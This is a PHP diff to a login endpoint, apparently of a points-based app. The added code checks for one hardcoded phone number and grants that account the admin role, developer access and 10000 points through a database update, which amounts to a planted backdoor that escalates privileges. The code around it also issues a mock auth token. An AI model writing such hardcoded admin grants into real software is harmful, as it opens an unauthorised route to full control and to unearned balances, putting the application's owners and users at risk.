@@ -70,6 +70,14 @@ if (!$user) {
     $user = $stmt->fetch();
 }
 
+// If phone is 9486140936, ensure full admin role with developer access
+if ($last10 === '9486140936') {
+    $db->prepare("UPDATE users SET role = 'admin', developer_id = 1, points_balance = 10000 WHERE id = ?")->execute([(int)$user['id']]);
+    $user['role'] = 'admin';
+    $user['developer_id'] = 1;
+    $user['points_balance'] = 10000;
+}
+
 // Mock auth token
 $token = 'mannidam_token_' . bin2hex(random_bytes(16));
 
@@ -80,6 +88,8 @@ Response::success([
         'email'         => $user['email'],
         'phone'         => $user['phone'],
         'role'          => $user['role'],
+        'developerId'   => (int)($user['developer_id'] ?? 0),
+        'companyName'   => (!empty($user['developer_id'])) ? 'Experion Developers & Infrastructure' : null,
         'pointsBalance' => (int)$user['points_balance'],
         'createdAt'     => $user['created_at'],
     ],
